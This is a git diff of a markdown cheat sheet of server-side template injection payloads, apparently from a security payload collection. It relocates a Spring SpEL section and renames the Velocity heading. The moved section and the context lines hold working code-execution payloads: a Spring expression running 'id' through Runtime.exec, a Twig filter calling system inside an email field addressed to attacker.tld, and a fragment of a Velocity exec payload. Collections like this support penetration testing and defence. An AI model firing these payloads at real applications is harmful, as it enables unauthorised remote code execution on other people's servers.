@@ -72,7 +72,8 @@
     - [Twig - Template format](#twig---template-format)
     - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
     - [Twig - Code execution](#twig---code-execution)
-  - [Java - Velocity](#velocity)
+  - [Java - Velocity](#java---velocity)
+  - [Java - Spring](#java---spring)
   - [PHP - patTemplate](#pattemplate)
   - [PHP - PHPlib](#phplib-and-html_template_phplib)
   - [PHP - Plates](#plates)
@@ -879,15 +880,6 @@ Execute code using SSTI for Slim engine.
 
 ---
 
-## Spring Framework (Java)
-
-```
-*{7*7}
-*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
-```
-
----
-
 ## Twig
 
 [Official website](https://twig.symfony.com/)
@@ -953,7 +945,7 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ---
 
-## Velocity
+## Java - Velocity
 
 [Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
 > Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.
@@ -967,6 +959,16 @@ $ex.waitFor()
 #foreach($i in [1..$out.available()])
 $str.valueOf($chr.toChars($out.read()))
 #end
+```
+
+---
+
+
+## Java - Spring
+
+```python
+*{7*7}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 ```
 
 ---
